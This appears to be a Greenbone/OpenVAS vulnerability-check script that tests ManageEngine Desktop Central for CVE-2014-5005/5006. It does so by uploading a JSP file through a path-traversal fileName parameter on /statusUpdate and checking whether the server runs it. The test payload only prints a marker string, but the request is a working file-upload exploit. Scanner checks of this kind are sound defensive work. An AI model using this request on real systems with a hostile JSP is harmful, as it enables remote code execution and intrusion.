CPE = "cpe:/a:zohocorp:manageengine_desktop_central";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105084" );
	script_bugtraq_id( 69494, 69493 );
	script_cve_id( "CVE-2014-5005", "CVE-2014-5006" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-09-23T06:03:53+0000" );
	script_name( "Multiple ManageEngine Products 7.0 - 9.0.054 Arbitrary File Upload Vulnerability" );
	script_tag( name: "last_modification", value: "2021-09-23 06:03:53 +0000 (Thu, 23 Sep 2021)" );
	script_tag( name: "creation_date", value: "2014-09-09 13:20:38 +0200 (Tue, 09 Sep 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_manage_engine_desktop_central_http_detect.sc" );
	script_mandatory_keys( "manageengine/desktop_central/http/detected" );
	script_require_ports( "Services/www", 8020 );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/69494" );
	script_tag( name: "impact", value: "An attacker may leverage this issue to upload arbitrary files to
  the affected computer. This can result in arbitrary code execution within the context of the
  vulnerable application." );
	script_tag( name: "vuldetect", value: "Check if it is possible to upload a file." );
	script_tag( name: "solution", value: "Ask the vendor for an update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Multiple ManageEngine Products are prone to an
  arbitrary-file-upload vulnerability." );
	script_tag( name: "affected", value: "ManageEngine Desktop Central/MSP versions 7.0 through 9.0.054." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
vtstrings = get_vt_strings();
vt_string_lo = vtstrings["lowercase"];
vt_string = vtstrings["default"];
pat = vt_string + " RCE Test";
ex = "<%= new String(\"" + pat + "\") %>";
len = strlen( ex );
file = vt_string_lo + "_" + rand() + ".jsp";
url = dir + "/statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../" + file + "&configDataID=1";
req = "POST " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Content-Length: " + len + "\r\n" + "Accept: */*\r\n" + "Content-Type: multipart/form-data;\r\n" + "\r\n" + ex;
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
url = dir + "/" + file;
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, pat )){
	report = "It was possible to upload the file \"" + dir + "/" + file + "\". Please delete this file.";
	report += "\n" + http_report_vuln_url( url: url, port: port );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

